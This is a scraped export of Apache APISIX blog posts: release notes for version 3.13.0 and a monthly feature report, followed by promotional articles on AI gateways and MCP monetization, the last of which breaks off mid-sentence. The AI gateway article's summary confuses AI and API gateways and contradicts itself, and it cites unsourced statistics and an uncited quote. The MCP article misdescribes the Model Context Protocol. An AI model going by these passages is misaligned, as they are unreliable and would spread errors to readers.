Feature Highlights\\n\\n### 1. Add devcontainer support\\n\\nPR: https://github.com/apache/apisix/pull/11765\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR adds devcontainer support for Linux, Windows (WSL2), and macOS across amd64/arm64 architectures, enabling seamless integration with mainstream development environments and ready-to-use functionality. Additionally, etcd is maintained using docker-compose and accessible on the local loopback.\\n\\n### 2. Add `headers` attribute for `loki-logger` plugin\\n\\nPR: https://github.com/apache/apisix/pull/11420\\n\\nContributor: [slow-groovin](https://github.com/slow-groovin)\\n\\nThis PR adds a `headers` attribute to the `loki-logger` plugin. This allows, for example, setting an authorization header when sending logs to a remote Loki service.\\n\\n### 3. Add `max_pending_entries` attribute to the batch processor\\n\\nPR: https://github.com/apache/apisix/pull/12338\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis feature introduces a new `max_pending_entries` option to the batch processor to prevent memory spikes when the log server is slow or unresponsive. This option allows dropping new entries if too many pending callbacks are waiting to be processed.\\n\\n### 4. Enhance Admin API filtering\\n\\nPR: https://github.com/apache/apisix/pull/12291\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThe Admin API now supports filtering routes and stream routes by `service_id` and `upstream_id`, making it easier to query and manage related resources, especially for the APISIX Dashboard project.\\n\\n### 5. Add APISIX dashboard to dev image\\n\\nPR: https://github.com/apache/apisix/pull/12369\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR builds the APISIX dashboard and puts it into the dev image.\\n\\n### 6. Add embedded APISIX dashboard UI\\n\\nPR: https://github.com/apache/apisix/pull/12276\\n\\nContributor: [bzp2010](https://github.com/bzp2010)\\n\\nThis PR adds a new embedded UI to APISIX as part of the Apache APISIX Dashboard Enhancement Plan.\\n\\n### 7. Build APISIX dashboard into the `apisix:dev` Docker image\\n\\nPR: https://github.com/apache/apisix/pull/12300\\n\\nContributor: [SkyeYoung](https://github.com/SkyeYoung)\\n\\nAs a part of the APISIX Dashboard Enhancement Plan, this PR adds a workflow, which triggers the building and pushing (to the master branch only) of the APISIX dashboard into the `apisix:dev` Docker image.\\n\\nMoving image-building files from apisix-docker to the main apisix repo improves maintenance and ensures the latest code is readily available for development and testing.\\n\\n### 8. Support JSON format in Standalone mode\\n\\nPR: https://github.com/apache/apisix/pull/12333\\n\\nContributor: [SkyeYoung](https://github.com/SkyeYoung)\\n\\nThis update introduces JSON format support for configuration in standalone file mode. It extends `apisix/core/config_yaml.lua`, enabling JSON compatibility without modifying the existing YAML configuration provider. This approach lays the groundwork for supporting additional formats like TOML in the future. JSON is also faster to parse compared to YAML.\\n\\n### 9. Allow more characters in `credential_id` for Standalone mode\\n\\nPR: https://github.com/apache/apisix/pull/12295\\n\\nContributor: [AlinsRan](https://github.com/AlinsRan)\\n\\nThis update expands the allowed characters in `credential_id` for the API-driven mode in standalone deployments. Now, `credential_id` can include underscores (_), periods (.), and short hyphens (-), enhancing flexibility for credential naming.\\n\\n### 10. Support dash (-) in consumer usernames\\n\\nPR: https://github.com/apache/apisix/pull/12296\\n\\nContributor: [AlinsRan](https://github.com/AlinsRan)\\n\\nThis PR adds support in APISIX for the same naming rules, aligning with the APISIX Ingress Controller\'s approach of isolating resources via namespace, using a `namespace-username` format for consumer names.\\n\\n### 11. Expose APISIX version in Prometheus `node_info` metric\\n\\nPR: https://github.com/apache/apisix/pull/12369\\n\\nContributor: [flearc](https://github.com/flearc)\\n\\nThis PR enhances the Prometheus `node_info` metric by adding a version label to expose the current APISIX version, improving observability and version tracking.\\n\\n### 12. Warn on etcd write operations in decoupled `data_plane` mode\\n\\nPR: https://github.com/apache/apisix/pull/12241\\n\\nContributor: [LiteSun](https://github.com/LiteSun)\\n\\nWhen APISIX is running in the decoupled mode as the data plane instance, it now logs warnings if the data plane instance performs etcd write operations via `core.etcd` functions or the CLI. Writes will be deprecated in future releases, where such operations will be disallowed.\\n\\n### 13. Replace events library with shdict\\n\\nPR: https://github.com/apache/apisix/pull/12353\\n\\nContributor: [Revolyssup](https://github.com/Revolyssup)\\n\\nThis PR switches the Nacos discovery mechanism from the `lua-resty-events` library to a shared dictionary (shdict). This change addresses previous issues where not all workers received events reliably, causing inconsistencies. Now, a privileged agent solely handles data fetching from Nacos and writing to the shdict, while all workers read from the shdict, ensuring consistent data access.\\n\\n## Conclusion\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials, and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences.\\n\\n## Recommended Blogs\\n\\n- [APISIX Gateway Practices in Tencent Games](https://apisix.apache.org/blog/2025/05/07/apisix-gateway-practice-in-tencent-timi/)\\n\\n  This article details how Tencent Games\' Timi Studio Group customized its API gateway based on APISIX. It played a critical role in meeting strict compliance requirements for overseas operations, reducing development and operations costs, and improving system flexibility and reliability.\\n\\n- [APISIX Gateway Practices in Honor\'s Massive Business](https://apisix.apache.org/blog/2025/04/27/apisix-honor-gateway-practice-in-massive-business/)\\n\\n  This article explains in detail how Honor adopted APISIX as its API gateway. Since introducing APISIX in 2021, Honor has continuously optimized and extended the platform to build a high-performance, scalable, and reliable gateway that effectively supports its rapidly growing business at scale.\\n\\n- [From stdio to HTTP SSE: Host Your MCP Server with APISIX API Gateway](https://apisix.apache.org/blog/2025/04/21/host-mcp-server-with-api-gateway/)\\n\\n  Discover how the Apache APISIX `mcp-bridge` plugin seamlessly converts stdio-based MCP servers to scalable HTTP SSE services."},{"id":"Release Apache APISIX 3.13.0","metadata":{"permalink":"/blog/2025/06/27/release-apache-apisix-3.13.0","source":"@site/blog/2025/06/27/release-apache-apisix-3.13.0.md","title":"Release Apache APISIX 3.13.0","description":"The Apache APISIX 3.13.0 version is released on June 27, 2025. This release includes a few changes, new features, bug fixes, and other improvements to user experiences.","date":"2025-06-27T00:00:00.000Z","formattedDate":"June 27, 2025","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.795,"truncated":true,"authors":[{"name":"Ashish Tiwari","title":"Author","url":"https://github.com/Revolyssup","image_url":"https://github.com/Revolyssup.png","imageURL":"https://github.com/Revolyssup.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"2025 Monthly Report (June 01 - June 30)","permalink":"/blog/2025/06/30/2025-june-monthly-report"},"nextItem":{"title":"AI Gateways: The Future Trend of AI Infrastructure","permalink":"/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure"}},"content":"We are glad to present Apache APISIX 3.13.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis release introduces a number of new features, including the `mcp-bridge` and `lago` plugins, the standalone Admin API, status health check endpoint, L4 proxy health check, and more.\\n\\nWhile there are no breaking changes, a few features have been marked for deprecation for future releases. Please review the deprecation notes to stay informed about future changes.\\n\\n## Deprecations\\n\\n### Mark the `server-info` plugin as deprecated\\n\\nThe `server-info` plugin is now marked for deprecation and will be removed in a future release. It periodically writes server info to etcd, which can cause performance issues in large clusters due to excessive etcd writes during startup.\\n\\nFor more information, see the [mailing list proposal](https://lists.apache.org/thread/nrwqo1gbc0z4z48fkb8dd4rn0trnfnz9) and [PR #12244](https://github.com/apache/apisix/pull/12244).\\n\\n### Warn on etcd write operations in decoupled `data_plane` mode\\n\\nWhen APISIX is running in the decoupled mode as the data plane instance, it now logs warnings if the data plane instance performs etcd write operations via core.etcd functions or the CLI. Writes will be deprecated in future releases, where such operations will be disallowed.\\n\\nFor more information, see the [mailing list proposal](https://lists.apache.org/thread/gfsooqm4cz6cx2sh7htmqgwlml5kggm2) outlining the future enforcement plan and [PR #12241](https://github.com/apache/apisix/pull/12241) for change in this release.\\n\\n## New Features\\n\\n### Add standalone Admin API\\n\\nThis release introduces a new Admin API for standalone mode, allowing users to manage in-memory configurations via HTTP PUT (to update) and GET (to retrieve). Configurations can be submitted in JSON or YAML, validated, and broadcast to all workers within the same APISIX instance\u2014making the mode fully stateless. This feature improves support for use cases such as the Ingress Controller.\\n\\nFor more information, see relevant PRs [#12179](https://github.com/apache/apisix/pull/12179), [#12214](https://github.com/apache/apisix/pull/12214), [#12256](https://github.com/apache/apisix/pull/12256), [#12295](https://github.com/apache/apisix/pull/12295), [#12317](https://github.com/apache/apisix/pull/12317), and [#12333](https://github.com/apache/apisix/pull/12333).\\n\\n### Support health check for L4 proxy\\n\\nAPISIX now supports upstream health checks when operating as an L4 proxy, enabling improved reliability and automatic failover for TCP/UDP traffic.\\n\\nFor more information, see PR [#12180](https://github.com/apache/apisix/pull/12180).\\n\\n### Add status health check endpoint\\n\\nThis release introduces a health check endpoint that indicates when APISIX is ready to serve traffic. In standalone mode, it reports readiness after configuration is loaded from external clients (e.g., Ingress Controller). When using etcd, the endpoint remains unhealthy until all workers have completed the initial configuration load. This helps external systems perform accurate readiness checks.\\n\\nFor more information, see [#12200](https://github.com/apache/apisix/pull/12200).\\n\\n### Add `mcp-bridge` plugin\\n\\nThis release introduces the `mcp-bridge` plugin, which converts stdio-based MCP servers to HTTP SSE-based interfaces, with support for subprocess management and prototype session handling across NGINX workers. To support broader use cases, the MCP server has been refactored into a standalone module, replacing the original mcp-bridge implementation with a more flexible framework while preserving backward compatibility through existing tests.\\n\\nFor more information, see [#12168](https://github.com/apache/apisix/pull/12168) and [#12151](https://github.com/apache/apisix/pull/12151).\\n\\n### Add `lago` plugin  \\n\\nThis release introduces the lago plugin, enabling integration with Lago for API monetization. The plugin logs API calls and charges consumers based on configured billing metrics and subscriptions. It supports flexible use cases such as token-based billing for AI services or per-call billing for APIs, and allows multiple routes to be linked to different pricing models for pay-as-you-go scenarios.\\n\\nFor more information, see [#12196](https://github.com/apache/apisix/pull/12196).\\n\\n### Add `headers` attribute to the `loki-logger` plugin\\n\\nThis release adds a `headers` attribute to the `loki-logger` plugin. This allows, for example, setting an authorization header when sending logs to a remote Loki service.\\n\\nFor more information, see [#12243](https://github.com/apache/apisix/pull/12243).\\n\\n### Add metadata fields to core resource schemas\\n\\nThis release adds standardized metadata for core resources, including name, description, and labels. The addition improves resource consistency and addresses issues in downstream projects.\\n\\nFor more information, see PR [#12224](https://github.com/apache/apisix/pull/12224).\\n\\n### Add `max_pending_entries` attribute to batch processor\\n\\nThis release introduces a new `max_pending_entries` option to the batch processor to prevent memory spikes when the log server is slow or unresponsive. This option allows dropping new entries if too many pending callbacks are waiting to be processed.\\n\\nFor more information, see PR [#12338](https://github.com/apache/apisix/pull/12338).\\n\\n### Enhance Admin API filtering\\n\\nThe Admin API now supports filtering routes and stream routes by `service_id` and `upstream_id`, making it easier to query and manage related resources, especially for the APISIX Dashboard project.\\n\\nFor more information, see PR [#12291](https://github.com/apache/apisix/pull/12291).\\n\\n### Expose APISIX version in Prometheus `node_info` metric\\n\\nThis release enhances the Prometheus `node_info` metric by adding a version label to expose the current APISIX version, improving observability and version tracking.\\n\\nFor more information, see PR [#12367](https://github.com/apache/apisix/pull/12367).\\n\\n### Support dash (-) in consumer usernames\\n\\nThis release allows the use of dashes (-) in consumer usernames. This is useful for scenarios such as namespacing in Kubernetes, where consumer names like namespace-username are needed for resource isolation.\\n\\nFor more information, see PR [#12296](https://github.com/apache/apisix/pull/12296).\\n\\n## Dependencies\\n\\nUpgraded core dependencies for improved stability, compatibility, and to address known issues:\\n\\n- Bumped OpenResty to v1.27.1.2 (PR [#12307](https://github.com/apache/apisix/pull/12307))\\n- Bumped LuaRocks to v3.12.0 (PR [#12305](https://github.com/apache/apisix/pull/12305))\\n\\n## Other Updates\\n\\n- Compare service discovery nodes by address to improve performance (PR [#12258](https://github.com/apache/apisix/pull/12258))\\n- Change log level to `debug` to reduce unnecessary logs (PR [#12361](https://github.com/apache/apisix/pull/12361))\\n- Adjust log level from `warn` to `info` when removing stale batch processors (PR [#12297](https://github.com/apache/apisix/pull/12297))\\n- Refactor `ai-proxy` plugin to move `read_response` into the `ai_driver.request` function (PR [#12101](https://github.com/apache/apisix/pull/12101))\\n- Prevent stale health checker from running when the number of new nodes is less than or equal to one (PR [#12118](https://github.com/apache/apisix/pull/12118))\\n- Release health checker when there are zero nodes (PR [#12126](https://github.com/apache/apisix/pull/12126))\\n- Parse and validate `apisix.yaml` in the CLI only during startup (PR [#12216](https://github.com/apache/apisix/pull/12216))\\n- Restrict TLSv1.3 cross-SNI session resumption (PR [#12366](https://github.com/apache/apisix/pull/12366))\\n- Fix data dump issue in Kubernetes service discovery single mode (PR [#12284](https://github.com/apache/apisix/pull/12284))\\n- Handle `nil` port cases in Consul by defaulting to port 80 (PR [#12304](https://github.com/apache/apisix/pull/12304))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3130)."},{"id":"AI Gateways: The Future Trend of AI Infrastructure","metadata":{"permalink":"/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure","source":"@site/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure.md","title":"AI Gateways: The Future Trend of AI Infrastructure","description":"Discover how AI gateways are revolutionizing enterprise AI infrastructure, offering centralized control, security, cost management, and governance for AI models and services.","date":"2025-06-18T00:00:00.000Z","formattedDate":"June 18, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.65,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Release Apache APISIX 3.13.0","permalink":"/blog/2025/06/27/release-apache-apisix-3.13.0"},"nextItem":{"title":"MCP Monetization: Navigating the AI Economy","permalink":"/blog/2025/06/18/mcp-monetization-navigating-ai-economy"}},"content":"> Discover how AI gateways are revolutionizing enterprise AI infrastructure, offering centralized control, security, cost management, and governance for AI models and services.\\n\x3c!--truncate--\x3e\\n\\n## AI Infrastructure Revolution\\n\\nThe enterprise AI landscape has exploded into fragmented chaos. Marketing teams deploy GPT-4 for content generation, developers fine-tune Llama 3 for coding assistants, while legal departments rely on Claude 3 for contract analysis. This siloed adoption creates three critical pain points:\\n\\n1. **Security Vulnerabilities**: 68% of enterprises report unauthorized AI tool usage leading to PII leaks (Gartner 2025)\\n2. **Cost Overruns**: Unmonitored token consumption causes 41% of companies to exceed AI budgets by 200%+ (McKinsey)\\n3. **Governance Failure**: 83% of compliance violations trace to inconsistent AI policy enforcement (Deloitte Audit Report)\\n\\nEnter **AI gateways**\u2014the middleware revolution transforming enterprise AI from experimental tools to production-grade infrastructure. These systems consolidate fragmented AI interactions through a unified control layer, much like Kubernetes did for container orchestration. An AI gateway is a specialized middleware layer that manages and secures interactions between your applications and AI models, such as **OpenAI**\'s offerings. This technology, akin to an **API gateway**, provides visibility and control over your AI applications. The future of AI infrastructure is increasingly modular, enabling flexible and robust machine learning teams.\\n\\n## What Is an AI Gateway\\n\\nAn [AI gateway](https://apisix.apache.org/blog/2025/03/06/what-is-an-ai-gateway/) is a middleware platform designed to manage and facilitate the integration and deployment of artificial intelligence models and services, such as OpenAI, Anthropic, Gemini, etc. It acts as a bridge between AI models and the applications that use them, simplifying integration and deployment, especially for large language models. Essentially, an AI gateway serves as a crucial control point for managing AI services within an organization. It also plays a vital role in security by inspecting inbound prompts and outbound responses to prevent data leaks and mitigate risks within the AI application workflow.\\n\\n![AI Gateway Architecture](https://static.api7.ai/uploads/2025/06/18/9qDk6nbs_1-ai-gateway-architecture.webp)\\n\\n## AI Gateway vs API Gateway: Critical Differences\\n\\nWhile [AI gateways and API gateways](https://apisix.apache.org/blog/2025/03/21/ai-gateway-vs-api-gateway-differences-explained/) share some infrastructure-level similarities, they differ significantly in purpose, functionality, and optimization.\\n\\n| Feature | AI Gateway | API Gateway |\\n|---------|------------|-------------|\\n| Primary Use Case | Managing, securing, and optimizing traffic to AI/LLM services (e.g., OpenAI, Anthropic, custom models) | Routing and securing general-purpose REST/gRPC APIs for web, mobile, and microservices |\\n| Request Characteristics | Often large payloads (e.g., prompts), streaming input/output, expensive per-call | Lightweight, transactional HTTP/gRPC requests |\\n| Cost Awareness | Tracks tokens, usage costs, and budget limits per user/app | Generally unaware of downstream compute or pricing costs |\\n| Observability Needs | Input/output tracing, latency + token logging, hallucination detection | Standard request logs, metrics (latency, throughput, error rate) |\\n| Security Features | PII redaction, prompt inspection, AI-specific abuse filters | OAuth, JWT, IP allowlists, rate limiting |\\n| Optimization Techniques | Caching AI responses, model fallback, prompt standardization, and dynamic routing by cost or latency | Load balancing, circuit breaking, and service discovery |\\n| Plugin Support | AI-specific (e.g., pre-/post-processing, moderation, reranking) | General plugins (e.g., auth, logging, CORS) |\\n| Streaming Support | Critical: supports real-time token streaming from LLMs | Optional: typically used for HTTP/2 or WebSocket |\\n| Governance Controls | Usage quotas, cost controls, and team-level restrictions for AI services | API-level access controls, usage policies per role/team |\\n| Integration Targets | LLM APIs (e.g., OpenAI, Anthropic, local models like Llama), AI agents, RAG systems | Microservices, internal APIs, public-facing APIs |\\n\\n**Summary of Key Distinctions**:\\n\\n- **Focus**: AI gateways specialize in **intelligent traffic management for AI models**, while AI gateways focus on standard API traffic orchestration.\\n- **Observability**: AI gateways require **fine-grained monitoring**, including cost and token-level visibility.\\n- **Security**: AI gateways offer **general web security**, whereas AI gateways need **content-level protections** (e.g., for prompt injection).\\n- **Optimization**: AI gateways can **route based on AI-specific metrics** (e.g., model latency, accuracy, cost), unlike traditional AI gateways.\\n\\n![AI Gateway and API Gateway](https://static.api7.ai/uploads/2025/06/18/ek1HZbV5_2-connections-of-api-gateway-and-ai-gateway.webp)\\n\\n## Why AI Gateways Are Essential for Enterprises?\\n\\nIn a world where AI adoption is accelerating, AI gateways offer a **critical layer of control, visibility, and governance**. They enable enterprises to confidently integrate AI into their systems securely, scalably, and sustainably.\\n\\n**You need an AI gateway when:**\\n\\n- You\'re using LLMs or AI APIs in production (e.g., OpenAI, Claude, Gemini).\\n- You want **centralized governance and cost control** over AI usage.\\n- You need **security and content moderation** for AI prompts/responses.\\n- You must **support multiple models** with fallback or dynamic routing.\\n\\nHere\'s a breakdown of **why AI gateways are crucial** for modern enterprises:\\n\\n### 1. Centralized Control for AI Services\\n\\nEnterprises today adopt multiple AI models (e.g., OpenAI, Hugging Face, internal LLMs) across cloud and on-prem environments. An AI gateway provides:\\n\\n- **Routing logic** based on cost, latency, or use case.\\n- **Model versioning** to avoid breaking downstream systems.\\n- **Fallback mechanisms** (e.g., if GPT-4 fails, fall back to Claude).\\n\\n![Centralized Control for AI Services](https://static.api7.ai/uploads/2025/06/18/buodC1KT_3-centralized-control-for-ai-services.webp)\\n\\n### 2. Security and Compliance\\n\\nAI gateways serve as security enforcement layers:\\n\\n- **Rate limiting and quota management** to control the usage of costly LLM APIs.\\n- **Authentication & Authorization** for internal and external consumers.\\n- **PII masking and data redaction** to ensure data privacy before reaching LLMs.\\n- **Audit logs** to support compliance (e.g., GDPR, SOC 2).\\n\\n### 3. Observability and Monitoring\\n\\nVisibility is critical when running generative AI workloads:\\n\\n- **Logging inputs/outputs and response times** for debugging.\\n- **Tracing** to understand latency bottlenecks.\\n- **Monitoring token usage and cost** for budget optimization.\\n\\n### 4. Performance Optimization\\n\\nAI gateways can significantly improve efficiency:\\n\\n- **Caching responses** to avoid redundant LLM calls.\\n- **Load balancing** across multiple AI model endpoints.\\n- **Streaming support** for faster UX in chat applications.\\n\\n### 5. Cost Control and Governance\\n\\nWith AI APIs costing per-token or per-call, an AI gateway enables:\\n\\n- **Usage policies per team or app** to prevent budget overages.\\n- **Token counting and cost attribution** for internal chargebacks.\\n- **Auto-throttling** or alerting based on budget thresholds.\\n\\n### 6. Flexibility for Hybrid/Multi-Cloud AI\\n\\nAI workloads are often hybrid (cloud + on-prem) or multi-cloud. An AI gateway:\\n\\n- Supports **traffic routing across environments**.\\n- Helps abstract away vendor-specific endpoints.\\n- Allows **easy swapping of model providers** without rewriting client code.\\n\\n### 7. Plugin Ecosystem for AI Use Cases\\n\\nAdvanced AI gateways support plugins for:\\n\\n- **Prompt templating and standardization**\\n- **Content moderation (e.g., toxicity detection)**\\n- **Custom pre- and post-processing**\\n\\n## Trends Shaping AI Gateways\\n\\nHere\'s a comprehensive look at the **trends shaping AI gateways** in 2025 and beyond, driven by advancements in large language models (LLMs), multi-model architectures, enterprise governance demands, and the need for scalable, secure AI infrastructure.\\n\\n### 1. Multi-Model Routing and Federation\\n\\nModern AI apps increasingly call multiple models\u2014OpenAI for coding, Claude for summarization, open-source LLMs for privacy.\\n\\n- **AI gateways are evolving to support multi-model orchestration**: routing requests based on latency, accuracy, cost, or trust.\\n- **Federated AI inference** across local, edge, and cloud-hosted models is becoming common.\\n\\n### 2. Token-Aware Cost Governance\\n\\nCost-first LLMOps with budget capping and per-call spend limits. LLM APIs are priced by token, making cost tracking critical.\\n\\n- **AI gateways now include token accounting, quota enforcement, and cost attribution per user/team.**\\n- Enterprises want **real-time dashboards** and budget guardrails to avoid unexpected bills.\\n\\n### 3. Prompt and Output Moderation Pipelines\\n\\n**Built-in security layers** are becoming standard for enterprise-grade LLM access. Prompt injection, jailbreaks, and hallucinations are real risks.\\n\\n- AI gateways increasingly support **pre-processing filters (for prompt safety) and post-processing checks (for toxic/hallucinated content).**\\n- Expect **pluggable moderation**, e.g., connecting to third-party content filters or in-house classifiers.\\n\\n![Prompt and Output Moderation Pipelines](https://static.api7.ai/uploads/2025/06/18/Vx6Fn7Nc_4-prompt-and-output-moderation-pipeline.webp)\\n\\n### 4. LLMOps Integration\\n\\nGateways now help **manage deployment lifecycle, usage policies, and routing across model updates**. AI gateways are becoming **key components of the LLMOps stack**, sitting between orchestrators, vector stores, and foundation models.\\n\\n- Seamless integration with **vector databases, RAG pipelines, fine-tuning services, and agent frameworks**.\\n- **Unified config and telemetry** across dev/test/prod environments.\\n\\n### 5. Hybrid and Multi-Cloud AI Infrastructure\\n\\nA gateway becomes the **unifying control plane** in a fragmented AI ecosystem. AI workloads are distributed across **SaaS APIs, private clusters, edge devices, and cloud VMs**.\\n\\n- AI gateways act as **cross-environment brokers**, abstracting model locations and offering **location-aware routing**.\\n- They ensure **policy compliance and telemetry collection** across all inference points.\\n\\n### 6. Open Standards and Ecosystem Interoperability\\n\\nThe ecosystem is trending toward **vendor-agnostic, modular AI infrastructure**. Avoiding lock-in is a top concern.\\n\\n- Movement toward **standardized APIs (e.g., OpenLLM, OpenAI-compatible APIs)**.\\n- Gateways support **pluggable backends**, open telemetry, and policy engines.\\n\\n## Conclusion: The Strategic Imperative\\n\\nAI gateways are **security enforcers, policy engines, observability hubs, and optimization layers** for enterprise AI. As AI adoption deepens, the gateway becomes the enterprise\'s trust boundary for AI. Enterprises implementing them now gain: **risk reduction, cost control, and velocity acceleration**.\\n\\nAs Anthropic CEO Dario Amodei notes: *\\"The next AI competitive advantage won\'t come from larger models, but from smarter orchestration*.\\"* Organizations delaying adoption face irreversible technical debt, while early adopters already attribute revenue growth to AI gateway-optimized personalization systems.\\n\\nThe future is clear: AI gateways are becoming the **central nervous system** of intelligent enterprises. Those who architect this layer today will dominate the AI-driven economy of tomorrow."},{"id":"MCP Monetization: Navigating the AI Economy","metadata":{"permalink":"/blog/2025/06/18/mcp-monetization-navigating-ai-economy","source":"@site/blog/2025/06/18/mcp-monetization-navigating-ai-economy.md","title":"MCP Monetization: Navigating the AI Economy","description":"Discover how API gateways like Apache APISIX enable MCP monetization, driving success in the AI economy through scalable, secure, and efficient AI model deployment.","date":"2025-06-18T00:00:00.000Z","formattedDate":"June 18, 2025","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.685,"truncated":true,"authors":[{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"AI Gateways: The Future Trend of AI Infrastructure","permalink":"/blog/2025/06/18/ai-gateway-future-trend-of-ai-infrastructure"},"nextItem":{"title":"Configure APISIX in a Single Command with APISIX-MCP","permalink":"/blog/2025/06/04/configure-apisix-in-a-single-command-with-apisix-mcp"}},"content":"> Discover how API gateways like Apache APISIX enable MCP monetization, driving success in the AI economy through scalable, secure, and efficient AI model deployment.\\n\x3c!--truncate--\x3e\\n\\nArtificial Intelligence (AI) has become the backbone of modern innovation, driving advancements across industries and reshaping the global economy. At the center of this transformation lies **MCP (Model Context Protocol)**, a framework for contextualizing, managing, and delivering AI/ML models. MCP enables seamless integration of AI into real-world applications, making it a pivotal tool for monetizing AI in today\'s competitive landscape.\\n\\nIn this blog, we\'ll dive deep into **MCP monetization** strategies, explore the role of API gateways, and demonstrate how Apache APISIX empowers developers to maximize their AI model\'s potential. By the end, you\'ll have actionable insights to navigate the AI economy and unlock new revenue streams.\\n\\n## What Is MCP and Why Is It Important for AI Monetization?\\n\\n### Defining MCP\\n\\nMCP is a **protocol** that provides the necessary context for AI/ML models to operate effectively in production environments. It ensures that AI models:\\n\\n- Understand and adapt to their deployment context (e.g., region, user preferences).\\n- Operate efficiently across diverse environments.\\n- Provide reliable outputs tailored to specific use cases.\\n\\nIn essence, MCP bridges the gap between raw AI/ML models and real-world applications, enabling seamless scaling, deployment, and monetization.\\n\\n### The Role of API Gateways\\n\\nAPI gateways, such as **Apache APISIX**, serve as the critical infrastructure for exposing AI/ML models as APIs. They:\\n\\n- Enable secure access to MCP-driven AI services.\\n- Manage API traffic to ensure scalability and performance.\\n- Provide observability and monitoring for AI/ML APIs in production.\\n\\nBy combining MCP with an API gateway, developers can efficiently monetize their AI models while ensuring a seamless user experience.\\n\\n### The Connections between API Gateways and MCP\\n\\nAPI gateways are evolving into **AI monetization control planes**, while MCP provides the **contextual layer** that transforms static data into actionable intelligence. Together, they enable:\\n\\n1. **Scalable AI Products**: Usage-based pricing aligned with token economics.\\n\\n2. **Ecosystem Growth**: MCP directories (e.g., Anthropic\'s 200+ tools) create API marketplaces 38.\\n\\n3. **Enterprise Efficiency**: Companies cut AI integration costs via MCP gateways.\\n\\nThe future lies in hybrid architectures where APIs and MCP coexist\u2014APIs as the backbone of system connectivity, and MCP as the AI-native orchestrator driving the next wave of AI economy.\\n\\n## The Growing AI Economy\\n\\n### What Is the AI Economy?\\n\\nThe AI economy encompasses the ecosystem of technologies, applications, and businesses built around AI/ML models.\\n\\n### Key Drivers of the AI Economy\\n\\n1. **AI Democratization**: Open-source frameworks like TensorFlow and PyTorch lower barriers to entry.\\n2. **Demand for Automation**: Industries increasingly rely on AI to automate workflows and reduce costs.\\n3. **Cloud-Native AI Services**: Platforms like AWS and Azure provide scalable AI model deployment infrastructure.\\n\\n### Challenges\\n\\nDespite its growth, monetizing AI comes with challenges:\\n\\n- **High Operational Costs**: Training and deploying AI models require significant resources.\\n- **Data Privacy Concerns**: Complying with regulations like GDPR and CCPA.\\n- **Scalability Issues**: Ensuring performance under varying workloads.\\n\\n## How API Gateways Empower MCP Monetization\\n\\nAPI gateways play a pivotal role in enabling and optimizing the monetization of MCP-driven AI models. By acting as intermediaries between AI models and end-users, API gateways provide the infrastructure required to expose, secure, and manage AI services efficiently. Here\'s how API gateways, such as **Apache APISIX**, empower MCP monetization:\\n\\n![MCP Monetization Workflow](https://static.api7.ai/uploads/2025/06/18/MpcXZDuZ_mcp-monetization-workflow.webp)\\n\\n### 1. Simplified API Exposure\\n\\nAPI gateways allow developers to expose AI/ML models as APIs, making them easily consumable by applications and end-users. Without an API gateway, managing direct connections to AI models becomes complex, especially as the number of services scales. With Apache APISIX, developers can:\\n\\n- Create APIs for MCP-driven models in minutes.\\n- Dynamically route requests to the appropriate model or service based on context.\\n\\nBy simplifying API exposure, gateways reduce time-to-market for monetized AI models.\\n\\n### 2. Dynamic Context Management\\n\\nMCP relies on contextual information (such as geographic location, user preferences, or application type) to deliver tailored AI results. API gateways enhance this functionality by:\\n\\n- **Dynamic Routing**: Routing requests to models based on contextual metadata (e.g., region-specific AI models or versions).\\n- **Context Injection**: Enriching requests with additional information required for MCP to process outputs effectively.\\n\\nThis ensures the AI model delivers the most relevant and accurate results, boosting customer satisfaction and monetization potential.\\n\\n### 3. Ensuring Scalability and Performance\\n\\nOne of the most critical aspects of monetizing MCP is ensuring that APIs can handle varying traffic loads without degrading performance. API gateways enable scalability through:\\n\\n- **Load Balancing**: Distributing traffic across multiple instances of AI models or API servers to prevent bottlenecks.\\n- **Edge Computing**: Deploying AI models closer to users to minimize latency and improve response times.\\n\\nFor example, a sentiment analysis API experiencing a surge in traffic can leverage Apache APISIX\'s dynamic load balancing to distribute requests across different regional servers, ensuring uninterrupted performance.\\n\\n![Scalability and Security](https://static.api7.ai/uploads/2025/06/18/Y9KYFAJq_scalability-and-security.webp)\\n\\n### 4. Security for Monetized APIs\\n\\nMonetizing MCP requires robust security measures to protect APIs, customer data, and intellectual property. API gateways provide essential security features such as:\\n\\n- **Authentication and Authorization**: Verifying user access through API keys, OAuth, or JWT (JSON Web Tokens).\\n- **Rate Limiting**: Preventing abuse by limiting the number of requests per user or application.\\n- **Data Encryption**: Ensuring secure communication between clients and the API using HTTPS and TLS.\\n\\nThese features help developers build trust with customers and comply with data privacy regulations like GDPR and CCPA.\\n\\n### 5. Observability for Monetized Services\\n\\nTo ensure the success of monetized AI/ML APIs, developers need real-time insights into API usage and performance. API gateways provide powerful observability tools, including:\\n\\n- **Traffic Analytics**: Monitoring request rates, latencies, and error rates.\\n- **Custom Metrics**: Tracking key metrics such as revenue per API call or user engagement.\\n- **Logging and Debugging**: Capturing 